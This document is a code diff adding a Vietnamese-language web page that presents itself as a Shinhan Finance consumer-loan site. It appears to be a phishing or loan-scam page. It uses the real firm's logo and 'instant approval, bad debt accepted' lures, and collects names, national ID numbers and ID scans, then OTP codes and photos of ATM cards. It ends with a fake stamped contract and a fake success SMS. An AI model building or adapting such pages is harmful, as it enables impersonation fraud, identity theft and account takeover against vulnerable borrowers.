@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Shinhan Finance - Vay tiêu dùng, thẻ tín dụng, lãi suất thấp, duyệt nhanh 60 giây">
+    <meta name="keywords" content="vay tiêu dùng, thẻ tín dụng, Shinhan Finance, vay nhanh">
+    <title>Shinhan Finance - Vay Nhanh</title>
+    <link rel="icon" href="https://www.shinhan.com.vn/favicon.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @media (max-width: 768px) {
+            .menu-items { display: none; }
+            .menu-items.active { display: block; position: absolute; top: 64px; left: 0; width: 100%; background: #004080; }
+            .hamburger { display: block; }
+            .banner { height: 400px; }
+            .banner h1 { font-size: 24px; }
+            .testimonials, .awards { grid-template-columns: 1fr; }
+        }
+        @media (min-width: 769px) { .hamburger { display: none; } }
+        .modal { transition: opacity 0.3s ease; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #004080; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .slider { overflow: hidden; position: relative; }
+        .slider-container { display: flex; transition: transform 0.5s ease; }
+        .slider-item { min-width: 100%; }
+    </style>
+</head>
+<body class="bg-gray-100 font-roboto">
+    <!-- Menu -->
+    <header class="bg-blue-900 text-white py-4 shadow-md fixed w-full top-0 z-10">
+        <div class="container mx-auto flex items-center justify-between px-4 max-w-6xl">
+            <a href="/" aria-label="Shinhan Finance Home">
+                <img src="https://www.shinhan.com.vn/images/logo.png" alt="Shinhan Finance Logo" class="h-12">
+            </a>
+            <button class="hamburger md:hidden cursor-pointer" aria-label="Toggle Menu">
+                <svg class="w-8 h-8" fill="white" viewBox="0 0 24 24">
+                    <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                </svg>
+            </button>
+            <nav class="menu-items hidden md:flex space-x-8 text-lg">
+                <a href="#home" class="hover:text-blue-300">Trang chủ</a>
+                <a href="#loans" class="hover:text-blue-300">Vay tiêu dùng</a>
+                <a href="#cards" class="hover:text-blue-300">Thẻ tín dụng</a>
+                <a href="#promotions" class="hover:text-blue-300">Khuyến mãi</a>
+                <a href="#about" class="hover:text-blue-300">Giới thiệu</a>
+                <a href="#contact" class="hover:text-blue-300">Liên hệ</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero -->
+    <section class="banner h-[600px] bg-cover bg-center flex items-center justify-center text-center md:text-left" style="background-image: linear-gradient(180deg, rgba(0,64,128,0.8), rgba(255,255,255,0.2)), url('https://via.placeholder.com/1920x600?text=Hero+Banner')">
+        <div class="container mx-auto max-w-6xl flex flex-col md:flex-row items-center px-4">
+            <div class="md:w-1/2 mb-6 md:mb-0">
+                <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">Vay dễ dàng, lãi nhẹ nhàng</h1>
+                <p class="text-lg text-white mb-6">Duyệt nhanh trong 60 giây, hỗ trợ nợ xấu, lãi suất từ 6.5%.</p>
+                <button onclick="document.querySelector('#register-form').scrollIntoView({behavior: 'smooth'})" class="bg-blue-900 text-white px-6 py-3 rounded-md hover:bg-blue-800">Đăng ký ngay</button>
+            </div>
+            <img src="https://imgur.com/FlO8y6b.jpg" alt="Vay nhanh" class="w-full md:w-1/3 rounded-lg" loading="lazy">
+        </div>
+    </section>
+
+    <!-- Loan Form -->
+    <section id="register-form" class="container mx-auto max-w-md bg-white p-8 rounded-lg shadow-md my-16">
+        <h2 class="text-2xl font-bold text-blue-900 text-center mb-6">Đăng Ký Vay</h2>
+        <form id="loanForm">
+            <div class="mb-4">
+                <label for="fullName" class="block text-gray-700 font-medium mb-1">Họ và tên</label>
+                <input type="text" id="fullName" class="w-full p-3 border rounded-md" placeholder="Nhập họ và tên" required>
+            </div>
+            <div class="mb-4">
+                <label for="phone" class="block text-gray-700 font-medium mb-1">Số điện thoại</label>
+                <input type="tel" id="phone" class="w-full p-3 border rounded-md" placeholder="090xxxxxxx" required>
+            </div>
+            <div class="mb-4">
+                <label for="email" class="block text-gray-700 font-medium mb-1">Email</label>
+                <input type="email" id="email" class="w-full p-3 border rounded-md" placeholder="email@example.com" required>
+            </div>
+            <div class="mb-4">
+                <label for="idNumber" class="block text-gray-700 font-medium mb-1">CCCD/CMND</label>
+                <input type="text" id="idNumber" class="w-full p-3 border rounded-md" placeholder="Nhập CCCD/CMND" required>
+            </div>
+            <div class="mb-4">
+                <label for="loanAmount" class="block text-gray-700 font-medium mb-1">Số tiền vay (VNĐ)</label>
+                <input type="number" id="loanAmount" class="w-full p-3 border rounded-md" placeholder="Nhập số tiền" min="1000000" required>
+            </div>
+            <div class="mb-4">
+                <label for="loanTerm" class="block text-gray-700 font-medium mb-1">Thời hạn vay (tháng)</label>
+                <input type="number" id="loanTerm" class="w-full p-3 border rounded-md" placeholder="Nhập số tháng" min="6" max="60" required>
+            </div>
+            <div class="mb-4">
+                <label for="loanType" class="block text-gray-700 font-medium mb-1">Loại vay</label>
+                <select id="loanType" class="w-full p-3 border rounded-md" required>
+                    <option value="">Chọn loại vay</option>
+                    <option value="unsecured">Vay tín chấp</option>
+                    <option value="auto">Vay mua xe</option>
+                    <option value="home">Vay mua nhà</option>
+                    <option value="renovation">Vay sửa nhà</option>
+                </select>
+            </div>
+            <div class="mb-4">
+                <label for="documents" class="block text-gray-700 font-medium mb-1">Tải CCCD/CMND</label>
+                <input type="file" id="documents" class="w-full p-3 border rounded-md" accept=".pdf,.jpg,.png">
+            </div>
+            <div class="mb-4 hidden" id="interestResult">
+                <p class="text-gray-700">Lãi suất: <span id="interestRate"></span>%/năm</p>
+                <p class="text-gray-700">Thanh toán hàng tháng: <span id="monthlyPayment"></span> VNĐ</p>
+            </div>
+            <button type="submit" class="w-full bg-blue-900 text-white p-3 rounded-md hover:bg-blue-800 disabled:bg-gray-400" disabled>Gửi đăng ký</button>
+        </form>
+    </section>
+
+    <!-- Testimonial -->
+    <section class="testimonials container mx-auto max-w-6xl py-8">
+        <h2 class="text-2xl font-bold text-blue-900 text-center mb-8">Đồng hành cùng Shinhan Finance</h2>
+        <div class="slider">
+            <div class="slider-container flex">
+                <div class="slider-item grid md:grid-cols-3 gap-6">
+                    <div class="bg-white p-6 rounded-lg shadow-md text-center">
+                        <p class="text-gray-700 mb-4">MoMo và Shinhan Finance hợp tác mang giá trị thiết thực.</p>
+                        <div class="w-12 h-12 bg-gray-300 rounded-full mx-auto mb-2"></div>
+                        <p class="font-bold text-blue-900">Mr. Bui Nhat Sang</p>
+                        <p class="text-sm italic text-gray-600">MoMo</p>
+                    </div>
+                    <div class="bg-white p-6 rounded-lg shadow-md text-center">
+                        <p class="text-gray-700 mb-4">VNPAY đồng hành cùng Shinhan Finance, chúc mừng 5 năm.</p>
+                        <div class="w-12 h-12 bg-gray-300 rounded-full mx-auto mb-2"></div>
+                        <p class="font-bold text-blue-900">Ms. Vo Thi Cam Nhung</p>
+                        <p class="text-sm italic text-gray-600">VNPAY</p>
+                    </div>
+                    <div class="bg-white p-6 rounded-lg shadow-md text-center">
+                        <p class="text-gray-700 mb-4">Nguyễn Kim và Shinhan Finance mang trải nghiệm tài chính minh bạch.</p>
+                        <div class="w-12 h-12 bg-gray-300 rounded-full mx-auto mb-2"></div>
+                        <p class="font-bold text-blue-900">Ms. Phan Thi Cam Tu</p>
+                        <p class="text-sm italic text-gray-600">Nguyen Kim</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="flex justify-center mt-4">
+            <button class="text-2xl text-blue-900 mx-2" data-slider-prev><</button>
+            <button class="text-2xl text-blue-900 mx-2" data-slider-next>></button>
+        </div>
+    </section>
+
+    <!-- Awards -->
+    <section class="awards container mx-auto max-w-6xl py-8">
+        <h2 class="text-2xl font-bold text-blue-900 text-center mb-8">Giải thưởng & Bằng khen</h2>
+        <div class="grid md:grid-cols-3 gap-6">
+            <div class="bg-white p-6 rounded-lg shadow-md text-center">
+                <img src="https://via.placeholder.com/96?text=Award1" alt="Top 10 Công ty Tài chính 2024" class="w-24 mx-auto mb-4" loading="lazy">
+                <h3 class="text-lg font-bold text-blue-900">Top 10 Công ty Tài chính 2024</h3>
+                <p class="text-gray-600 text-sm">Hiệp hội Tài chính Việt Nam.</p>
+            </div>
+            <div class="bg-white p-6 rounded-lg shadow-md text-center">
+                <img src="https://via.placeholder.com/96?text=Award2" alt="Dịch vụ Khách hàng Xuất sắc 2023" class="w-24 mx-auto mb-4" loading="lazy">
+                <h3 class="text-lg font-bold text-blue-900">Dịch vụ Khách hàng Xuất sắc 2023</h3>
+                <p class="text-gray-600 text-sm">Tạp chí Tài chính Quốc tế.</p>
+            </div>
+            <div class="bg-white p-6 rounded-lg shadow-md text-center">
+                <img src="https://via.placeholder.com/96?text=Award3" alt="Sáng tạo Tài chính 2022" class="w-24 mx-auto mb-4" loading="lazy">
+                <h3 class="text-lg font-bold text-blue-900">Sáng tạo Tài chính 2022</h3>
+                <p class="text-gray-600 text-sm">Ngân hàng Nhà nước Việt Nam.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-blue-900 text-white py-8">
+        <div class="container mx-auto max-w-6xl grid md:grid-cols-4 gap-8 px-4">
+            <div>
+                <img src="https://www.shinhan.com.vn/images/logo.png" alt="Shinhan Finance Logo" class="h-12 mb-4">
+                <p class="text-sm">Giải pháp tài chính Hàn Quốc, minh bạch, an toàn.</p>
+            </div>
+            <div>
+                <h3 class="text-lg font-bold mb-4">Liên hệ</h3>
+                <p class="text-sm">Email: <a href="mailto:support@shinhanfinance.com.vn" class="hover:text-blue-300">support@shinhanfinance.com.vn</a></p>
+                <p class="text-sm">Hotline: <a href="tel:19001577" class="hover:text-blue-300">1900 1577</a></p>
+                <p class="text-sm">Địa chỉ: TP.HCM, Việt Nam</p>
+            </div>
+            <div>
+                <h3 class="text-lg font-bold mb-4">Link nhanh</h3>
+                <ul class="text-sm">
+                    <li><a href="#loans" class="hover:text-blue-300">Sản phẩm</a></li>
+                    <li><a href="#services" class="hover:text-blue-300">Dịch vụ</a></li>
+                    <li><a href="#policy" class="hover:text-blue-300">Chính sách</a></li>
+                </ul>
+            </div>
+            <div>
+                <h3 class="text-lg font-bold mb-4">Kết nối</h3>
+                <div class="flex space-x-4">
+                    <a href="#" class="w-8 h-8 bg-white rounded-full flex items-center justify-center text-blue-900 hover:bg-gray-200" aria-label="Facebook">F</a>
+                    <a href="#" class="w-8 h-8 bg-white rounded-full flex items-center justify-center text-blue-900 hover:bg-gray-200" aria-label="YouTube">Y</a>
+                </div>
+            </div>
+        </div>
+        <p class="text-center text-sm mt-8">© 2025 Shinhan Finance</p>
+    </footer>
+
+    <!-- Modal -->
+    <div class="modal hidden fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50" id="confirm-modal">
+        <div class="modal-content bg-white p-8 rounded-lg max-w-md w-full text-center">
+            <h2 class="text-xl font-bold text-blue-900 mb-4">Xác Nhận Hồ Sơ</h2>
+            <p class="text-gray-600 mb-4">Nhập OTP gửi qua SMS/Email</p>
+            <input type="text" id="otp" class="w-full p-3 border rounded-md mb-4" placeholder="Nhập OTP">
+            <input type="file" accept="image/*" class="w-full p-2 border rounded-md mb-4" aria-label="Ảnh CCCD">
+            <input type="file" accept="image/*" class="w-full p-2 border rounded-md mb-4" aria-label="Ảnh thẻ ATM">
+            <p class="no-card text-blue-900 text-sm cursor-pointer underline mb-4">Không có thẻ ATM?</p>
+            <button class="w-full bg-blue-900 text-white p-3 rounded-md hover:bg-blue-800" data-confirm>Xác nhận</button>
+            <div class="loader hidden"></div>
+        </div>
+    </div>
+
+    <!-- Contract Display -->
+    <section class="contract-display hidden container mx-auto max-w-6xl bg-white p-8 rounded-lg shadow-md my-8 text-center">
+        <h2 class="text-2xl font-bold text-blue-900 mb-4">Hợp Đồng Vay</h2>
+        <p class="text-gray-600 mb-4">Hồ sơ đã được xác nhận.</p>
+        <div id="contract-content" class="border p-4 rounded-md text-left text-gray-600"></div>
+        <img src="https://www.shinhan.com.vn/images/contract-stamped.jpg" alt="Hợp đồng" class="w-full max-w-[250px] rounded-lg mt-4 mx-auto" loading="lazy">
+    </section>
+
+    <script>
+        // Sanitize input
+        const sanitizeInput = (input) => {
+            const div = document.createElement('div');
+            div.textContent = input;
+            return div.innerHTML;
+        };
+
+        // Validate form
+        const validateForm = (data) => {
+            const errors = [];
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^[0-9]{10}$/;
+            const idRegex = /^[0-9]{9,12}$/;
+
+            if (!data.fullName) errors.push('Họ và tên là bắt buộc');
+            if (!phoneRegex.test(data.phone)) errors.push('Số điện thoại phải có 10 chữ số');
+            if (!emailRegex.test(data.email)) errors.push('Email không hợp lệ');
+            if (!idRegex.test(data.idNumber)) errors.push('CCCD/CMND phải có 9-12 chữ số');
+            if (data.loanAmount < 1000000) errors.push('Số tiền vay tối thiểu 1,000,000 VNĐ');
+            if (data.loanTerm < 6 || data.loanTerm > 60) errors.push('Thời hạn vay từ 6-60 tháng');
+            if (!data.loanType) errors.push('Vui lòng chọn loại vay');
+
+            return errors;
+        };
+
+        // Calculate interest
+        const calculateInterest = (amount, term, type) => {
+            const rates = { unsecured: 8, auto: 6.5, home: 7, renovation: 7.5 };
+            const rate = rates[type] || 8;
+            const monthlyRate = rate / 100 / 12;
+            const monthlyPayment = (amount * monthlyRate * Math.pow(1 + monthlyRate, term)) / (Math.pow(1 + monthlyRate, term) - 1);
+            return { rate, monthlyPayment: monthlyPayment.toLocaleString('vi-VN') };
+        };
+
+        // Menu toggle
+        document.querySelector('.hamburger').addEventListener('click', () => {
+            document.querySelector('.menu-items').classList.toggle('active');
+        });
+
+        // Form handling
+        const loanForm = document.getElementById('loanForm');
+        const submitButton = loanForm.querySelector('button[type="submit"]');
+        const inputs = loanForm.querySelectorAll('input, select');
+
+        inputs.forEach(input => {
+            input.addEventListener('input', () => {
+                submitButton.disabled = !Array.from(inputs).every(i => i.value || i.type === 'file');
+            });
+        });
+
+        loanForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = {
+                fullName: sanitizeInput(document.getElementById('fullName').value),
+                phone: document.getElementById('phone').value,
+                email: document.getElementById('email').value,
+                idNumber: document.getElementById('idNumber').value,
+                loanAmount: parseFloat(document.getElementById('loanAmount').value),
+                loanTerm: parseInt(document.getElementById('loanTerm').value),
+                loanType: document.getElementById('loanType').value
+            };
+
+            const errors = validateForm(formData);
+            if (errors.length) {
+                alert(errors.join('\n'));
+                return;
+            }
+
+            const { rate, monthlyPayment } = calculateInterest(formData.loanAmount, formData.loanTerm, formData.loanType);
+            document.getElementById('interestRate').textContent = rate;
+            document.getElementById('monthlyPayment').textContent = monthlyPayment;
+            document.getElementById('interestResult').classList.remove('hidden');
+
+            // Simulate API call
+            try {
+                const response = await fetch('http://localhost:5000/api/loan/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+                const data = await response.json();
+                if (data.error) throw new Error(data.error);
+                document.getElementById('confirm-modal').classList.remove('hidden');
+                document.getElementById('otp').dataset.otpId = data.otpId;
+                document.getElementById('contract-content').dataset.contractId = data.contractId;
+            } catch (error) {
+                alert(`Lỗi: ${error.message}`);
+            }
+        });
+
+        // Modal confirm
+        document.querySelector('[data-confirm]').addEventListener('click', async () => {
+            const otp = document.getElementById('otp').value;
+            const otpId = document.getElementById('otp').dataset.otpId;
+            const contractId = document.getElementById('contract-content').dataset.contractId;
+            const loader = document.querySelector('.loader');
+            const confirmButton = document.querySelector('[data-confirm]');
+            loader.classList.remove('hidden');
+            confirmButton.disabled = true;
+
+            try {
+                const response = await fetch('http://localhost:5000/api/loan/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ otp, otpId, contractId })
+                });
+                const data = await response.json();
+                if (data.error) throw new Error(data.error);
+
+                document.getElementById('confirm-modal').classList.add('hidden');
+                document.querySelector('.contract-display').classList.remove('hidden');
+
+                const formData = {
+                    fullName: sanitizeInput(document.getElementById('fullName').value),
+                    idNumber: document.getElementById('idNumber').value,
+                    loanAmount: parseFloat(document.getElementById('loanAmount').value),
+                    loanTerm: parseInt(document.getElementById('loanTerm').value),
+                    loanType: document.getElementById('loanType').value
+                };
+
+                document.getElementById('contract-content').innerHTML = `
+                    <h3 class="text-lg font-bold text-blue-900">HỢP ĐỒNG VAY SHINHAN FINANCE</h3>
+                    <p><strong>Số hợp đồng:</strong> ${contractId}</p>
+                    <p><strong>Ngày ký:</strong> ${new Date().toLocaleDateString('vi-VN')}</p>
+                    <p><strong>Bên vay:</strong> ${formData.fullName}</p>
+                    <p><strong>CCCD/CMND:</strong> ${formData.idNumber}</p>
+                    <p><strong>Số tiền vay:</strong> ${formData.loanAmount.toLocaleString('vi-VN')} VNĐ</p>
+                    <p><strong>Thời hạn vay:</strong> ${formData.loanTerm} tháng</p>
+                    <p><strong>Loại vay:</strong> ${formData.loanType === 'unsecured' ? 'Vay tín chấp' : formData.loanType === 'auto' ? 'Vay mua xe' : formData.loanType === 'home' ? 'Vay mua nhà' : 'Vay sửa nhà'}</p>
+                    <p><strong>Lãi suất:</strong> ${calculateInterest(formData.loanAmount, formData.loanTerm, formData.loanType).rate}%/năm</p>
+                    <p><strong>Điều khoản:</strong> Thanh toán đúng hạn. Phí tất toán: 3% dư nợ trong 3 năm đầu.</p>
+                `;
+                alert('SMS: "Shinhan Finance: Vay thành công. Kiểm tra hợp đồng."');
+            } catch (error) {
+                alert(`Lỗi: ${error.message}`);
+            } finally {
+                loader.classList.add('hidden');
+                confirmButton.disabled = false;
+            }
+        });
+
+        // No card guide
+        document.querySelector('.no-card').addEventListener('click', () => {
+            alert('Đăng nhập Shinhan SOL hoặc đến chi nhánh.');
+        });
+
+        // Slider
+        const sliderContainer = document.querySelector('.slider-container');
+        const prevButton = document.querySelector('[data-slider-prev]');
+        const nextButton = document.querySelector('[data-slider-next]');
+        let currentIndex = 0;
+
+        const updateSlider = () => {
+            sliderContainer.style.transform = `translateX(-${currentIndex * 100}%)`;
+        };
+
+        prevButton.addEventListener('click', () => {
+            currentIndex = currentIndex > 0 ? currentIndex - 1 : 0;
+            updateSlider();
+        });
+
+        nextButton.addEventListener('click', () => {
+            currentIndex = currentIndex < 0 ? currentIndex + 1 : 0;
+            updateSlider();
+        });
+
+        setInterval(() => {
+            currentIndex = currentIndex < 0 ? currentIndex + 1 : 0;
+            updateSlider();
+        }, 5000);
+    </script>
+</body>
+</html>
